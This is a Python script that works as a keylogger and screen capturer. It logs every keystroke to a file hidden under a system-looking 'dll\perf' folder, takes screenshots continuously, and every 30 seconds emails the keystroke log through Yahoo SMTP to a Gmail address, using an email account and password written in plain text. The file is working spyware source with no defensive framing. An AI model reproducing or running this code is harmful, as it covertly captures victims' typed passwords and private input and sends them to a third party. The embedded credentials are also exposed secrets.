import os
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import threading
from pynput import keyboard
import pyautogui

def main():

    def logger():
        path = '\\System\\files\\logs\\dll\\perf\\'
        logs = []
        log_dir = os.makedirs(path, 0o777, exist_ok=True)
        logging.basicConfig(filename=(path + "key_log.txt"), level=logging.DEBUG, format='%(message)s')
        

        def on_press(key):
            f = open('C:\\System\\files\\logs\\dll\\perf\\your_log.txt', 'a')
            logging.info(str(key))
            logs.append(key)
            print(logs)
            f.write('%s' % key)
            try:
                if len(logs) % 100 == 0:
                    f.close()
            except ValueError:
                f = open('C:\\System\\files\\logs\\dll\\perf\\your_log.txt', 'a')

        
        # Collect events until released
        with keyboard.Listener(
                on_press=on_press) as listener:
            listener.join()

    def screen_shot():
        x = 0
        while True:
            path = 'C:\\System\\files\\logs\\dll\\perf\\'
            test = os.listdir(path)
            pyautogui.screenshot('C:\\System\\files\\logs\\dll\\perf\\Image'+str(x)+'.png')
            x+=1
            time.sleep(.1)
            try:
                if x % 10 == 0:
                    
                    for i in test:
                        if i.endswith('.png'):
                            os.unlink(os.path.join(path, i))
                        
                        
            except Exception:
                continue
    def mail():
        #var for image attachemnt number, will always send stead stream,
        #concatenate number to "image" to match file name
        y = 0 
        while True:
            y+=1
            email_user = 'jameseroni@yahoo.com'
            email_password = 'Gr@ndtet0n!23'
            email_send = 'jameseroni@gmail.com'

            subject = 'Test'
            #Creating message object for email.  Tying message object to variables above.


            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_send
            msg['Subject'] = subject
            #Actual message.
            body = 'Hi there, sending this email from Python!'
            #Attach a file
            msg.attach(MIMEText(body,'plain'))
            #File path needs double slash here. Filename is reference variable to file location
            #Also time sleep is 15*60 for 15 min.  Will send email every 15 min.
            #If time sleep is affected underneath SMTP, you will have timeout issues.
            time.sleep(30)
            filename= ('C:\\System\\files\\logs\\dll\\perf\\your_log.txt')
            
            #create attachment variable, open, filename and 
            
            attachment=open(filename,'rb')
            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',"attachment; filename= "+filename)
            msg.attach(part)
            text = msg.as_string()

            
            server = smtplib.SMTP(host = 'smtp.mail.yahoo.com', port = 587)
            server.starttls()
            server.login(email_user,email_password)
            #send message
            
            try:
                server.sendmail(email_user,email_send,text)
                print("Success")
                time.sleep(1)
            except Exception:
                print("Message failed to send")
                
            server.quit()
    w1 = threading.Thread(target = screen_shot)
    w1.start()
    w = threading.Thread(target = logger)
    w.start()
                        
    mail()




main()




